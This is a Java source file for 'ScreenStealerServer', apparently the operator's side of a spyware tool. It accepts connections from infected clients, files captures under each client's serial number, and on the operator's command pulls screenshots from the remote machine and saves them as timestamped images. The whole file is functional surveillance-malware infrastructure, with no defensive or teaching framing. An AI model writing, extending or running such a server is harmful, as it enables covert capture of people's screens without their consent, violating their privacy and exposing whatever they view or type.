package screenstealerserver;

import java.net.ServerSocket;
import java.net.Socket;
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.FileOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.util.Date;
import java.text.DateFormat;
import java.text.SimpleDateFormat;

public class ScreenStealerServer {

    private static final int PORT = 7654;
    private static ServerSocket ss = null;
    
    public static void main(String[] args) {
        try {
            ss = new ServerSocket(PORT);
            while(true) {
                Socket sock = ss.accept();
                new ClientThread(sock).start();
            }
        } catch(IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if(ss != null)
                    ss.close();
            } catch(IOException e) {
                e.printStackTrace();
            }
        }
    }
    
    private static class ClientThread extends Thread {
        
        private final Socket sock;
        private PrintWriter pw;
        private final BufferedReader input;
        private FileOutputStream fos;
        private DataInputStream dis;
        
        public ClientThread(Socket sock) {
            this.sock = sock;
            this.pw = null;
            this.input = new BufferedReader(new InputStreamReader(System.in));
            this.fos = null;
            this.dis = null;
        }
        
        @Override
        public void run() {
            try {
                System.out.println("Connection from client " + sock.getInetAddress().toString());
                pw = new PrintWriter(sock.getOutputStream(), true);
                dis = new DataInputStream(sock.getInputStream());
                String serial = dis.readUTF();
                System.out.println("Received Serial: " + serial);
                File dir = new File(serial);
                dir.mkdirs();
                byte[] recv;
                int size;
                while(!pw.checkError()) {
                    System.out.println("Insert 1 to take a screenshot, 0 to close connection");
                    int answer = Integer.parseInt(input.readLine());
                    if(answer == 0 && !pw.checkError()) {
                        pw.println("STOP");
                        break;
                    } else if(answer == 1 && !pw.checkError()) {
                        pw.println("GO");
                        size = dis.readInt();
                        if(size > 0) {
                            recv = new byte[size];
                            dis.readFully(recv, 0, size);
                            DateFormat df = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss");
                            Date now = new Date();
                            fos = new FileOutputStream(serial + "\\" + df.format(now) + ".png");
                            fos.write(recv);
                            try {
                                fos.close();
                            } catch(IOException e) {
                                e.printStackTrace();
                            }
                            System.out.println("Screenshot received!");
                        }
                    }
                }
            } catch(IOException | NumberFormatException e) {
                e.printStackTrace();
            } finally {
                System.out.println("Connection with " + sock.getInetAddress().toString() + " closed");
                try {
                    if(pw != null)
                        pw.close();
                    if(dis != null)
                        dis.close();
                    if(sock != null)
                        sock.close();
                } catch(IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
